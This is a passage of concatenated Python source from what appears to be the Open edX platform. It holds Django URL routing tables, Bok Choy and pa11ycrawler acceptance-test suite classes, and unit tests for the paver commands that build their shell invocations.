    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name="foldit_ops"),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name="hint_manager"),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'

"""
Tests for the bok-choy paver commands themselves.
Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py
"""
import os
import unittest

from mock import patch, call
from test.test_support import EnvironmentVarGuard
from paver.easy import BuildFailure
from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler

REPO_DIR = os.getcwd()


class TestPaverBokChoyCmd(unittest.TestCase):
    """
    Paver Bok Choy Command test cases
    """

    def _expected_command(self, name, store=None, verify_xss=False):                    
        """
        Returns the command that is expected to be run for the given test spec
        and store.
        """

        expected_statement = (
            "DEFAULT_STORE={default_store} "
            "SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' "
            "BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' "
            "BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' "
            "SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' "
            "VERIFY_XSS='{verify_xss}' "
            "nosetests {repo_dir}/common/test/acceptance/{exp_text} "
            "--with-xunit "
            "--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml "
            "--verbosity=2 "
        ).format(
            default_store=store,
            repo_dir=REPO_DIR,
            shard_str='/shard_' + self.shard if self.shard else '',
            exp_text=name,
            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',
            verify_xss=verify_xss
        )
        return expected_statement

    def setUp(self):
        super(TestPaverBokChoyCmd, self).setUp()
        self.shard = os.environ.get('SHARD')
        self.env_var_override = EnvironmentVarGuard()

    def test_default(self):
        suite = BokChoyTestSuite('')
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_suite_spec(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_class_spec(self):
        spec = 'test_foo.py:FooTest'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_testcase_spec(self):
        spec = 'test_foo.py:FooTest.test_bar'
        suite = BokChoyTestSuite('', test_spec=spec)
        name = 'tests/{}'.format(spec)
        self.assertEqual(suite.cmd, self._expected_command(name=name))

    def test_spec_with_draft_default_store(self):
        spec = 'test_foo.py'
        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')
        name = 'tests/{}'.format(spec)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='draft')
        )

    def test_invalid_default_store(self):
        # the cmd will dumbly compose whatever we pass in for the default_store
        suite = BokChoyTestSuite('', default_store='invalid')
        name = 'tests'
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=name, store='invalid')
        )

    def test_serversonly(self):
        suite = BokChoyTestSuite('', serversonly=True)
        self.assertEqual(suite.cmd, "")

    def test_verify_xss(self):
        suite = BokChoyTestSuite('', verify_xss=True)
        name = 'tests'
        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))                    

    def test_verify_xss_env_var(self):
        self.env_var_override.set('VERIFY_XSS', 'True')                    
        with self.env_var_override:
            suite = BokChoyTestSuite('')
            name = 'tests'
            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))                    

    def test_test_dir(self):
        test_dir = 'foo'
        suite = BokChoyTestSuite('', test_dir=test_dir)
        self.assertEqual(
            suite.cmd,
            self._expected_command(name=test_dir)
        )

    def test_verbosity_settings_1_process(self):
        """
        Using 1 process means paver should ask for the traditional xunit plugin for plugin results
        """
        expected_verbosity_string = (
            "--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else ''
            )
        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """
        process_count = 2
        expected_verbosity_string = (
            "--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml"
            " --processes={procs} --no-color --process-timeout=1200".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """
        With the above test, validate that num_processes can be set to various values
        """
        process_count = 3
        expected_verbosity_string = (
            "--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml"
            " --processes={procs} --no-color --process-timeout=1200".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """
        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """
        Returns the expected command to run pa11ycrawler.
        """
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter="1.0-json" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])

"""
Class used for defining and running Bok Choy acceptance test suite
"""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / "xunit.xml"
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))                    
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', "Checking for mongo, memchache, and mysql...")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', "Confirming servers have started...")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', "Cleaning up databases...")
            print msg
            sh("./manage.py lms --settings bok_choy flush --traceback --noinput")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct "multiprocess" nosetest substring
            substring = [
                "--with-xunitmp --xunitmp-file={}".format(self.xunit_report),
                "--processes={}".format(self.num_processes),
                "--no-color --process-timeout=1200"
            ]

        else:
            substring = [
                "--with-xunit",
                "--xunit-file={}".format(self.xunit_report),
                "--verbosity={}".format(self.verbosity),
            ]

        return " ".join(substring)

    def prepare_bokchoy_run(self):
        """
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """
        sh("{}/scripts/reset-test-db.sh".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', "Confirming servers are running...")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """
        msg = colorize('green', "Importing courses from {}...".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                "DEFAULT_STORE={default_store}"
                " ./manage.py cms --settings=bok_choy import {import_dir}".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """
        Loads data into database from db_fixtures
        """
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            "DEFAULT_STORE={default_store}"
            " ./manage.py lms --settings bok_choy loaddata --traceback"
            " common/test/db_fixtures/*.json".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print "Stopping bok-choy servers.\n"
                break

    @property
    def cmd(self):
        """
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return ""

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            "DEFAULT_STORE={}".format(self.default_store),
            "SCREENSHOT_DIR='{}'".format(self.log_dir),
            "BOK_CHOY_HAR_DIR='{}'".format(self.har_dir),
            "BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'".format(self.a11y_file),
            "SELENIUM_DRIVER_LOG_DIR='{}'".format(self.log_dir),
            "VERIFY_XSS='{}'".format(self.verify_xss),
            "nosetests",
            test_spec,
            "{}".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append("--pdb")
        if self.save_screenshots:
            cmd.append("--with-save-baseline")
        cmd.append(self.extra_args)

        cmd = (" ").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = "https://github.com/edx/demo-test-course/archive/master.tar.gz"

        self.start_urls = []
        auto_auth_params = {
            "redirect": 'true',
            "staff": 'true',
            "course_id": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append("\"http://localhost:8031/auto_auth?{}\"".format(cms_params))

        sequence_url = "/api/courses/v1/blocks/?{}".format(
            urlencode({
                "course_id": self.course_key,
                "depth": "all",
                "all_blocks": "true",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append("\"http://localhost:8003/auto_auth?{}\"".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """
        Fetches the test course.
        """
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', "Fetching the test course from github...")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', "Uncompressing the test course...")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """
        Runs pa11ycrawler json-to-html
        """
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """
        Runs pa11ycrawler as staff user against the test course.
        """
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter="{reporter}" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter="1.0-json",
            dont_go_here="logout",
            depth="6",
        )
        return cmd_str

from django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name="root"),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name="dashboard"),
    url(r'^login$', 'student.views.signin_user', name="signin_user"),
    url(r'^register$', 'student.views.register_user', name="register_user"),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name="change_email"),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name="change_name"),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name="accounts_login"),

    url(r'^login_ajax$', 'student.views.login_user', name="login"),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name="activate"),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name="begin_exam_registration"),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name="university_profile"),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name="404"),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name="jobs"),
        url(r'^press$', 'student.views.press', name="press"),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name="media-kit"),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name="faq_edx"),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name="help_edx"),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name="copyright"),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == "ROOT" or key == "COURSES" or key == "FAQ":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = "%s.html" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
        template = "theme-" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name="course_wiki"),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name="jump_to"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name="user_software_license"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name="courses"),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name="change_enrollment"),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name="about_course"),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name="course_root"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name="info"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name="syllabus"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.index', name="book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.pdf_index'),                    
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.html_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name="courseware"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name="courseware_chapter"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name="courseware_section"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name="courseware_position"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name="progress"),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name="student_progress"),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
